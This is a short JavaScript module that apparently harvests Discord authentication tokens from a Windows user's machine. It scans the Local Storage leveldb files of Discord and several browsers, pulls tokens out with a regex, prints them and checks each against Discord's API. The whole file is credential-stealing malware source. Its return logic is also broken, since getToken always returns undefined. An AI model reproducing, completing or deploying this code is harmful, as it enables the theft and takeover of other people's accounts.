const fs = require('fs');
const request = require('request');

let paths = [
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
]

async function get_token(path) {
    try {
        fs.readdir(path, (err, files) => {
            if (files === undefined) {
                return
            }

            var filtro = files.filter(f => f.split('.').pop() === "ldb")
            for (i = 0; i < filtro.length; i++) {
                fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
                    let regex = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{36}"/;

                    let [match] = regex.exec(data) || [null];
                    if (match != null) {
                        match = match.replace(/"/g, '')
                        console.log(match);
                        request.post({
                            url: 'https://discord.com/api/v9/users/@me/',
                            headers: {
                                'Authorization': match
                            }
                        }, function (err, res, body) {
                            if (err) {
                                return undefined;
                            }
                            if (res.statusCode == 200) {
                                return match;
                            }
                        });
                    }
                })
            }
        });
    } catch (err) {
        console.log(err)
    }
}


module.exports = {
    getToken: () => {
        let arr = [];
        paths.forEach(path => {
            let token = get_token(path);
            if (token != undefined) {
                arr.push(token);
            }
        })
        return undefined;
    }
}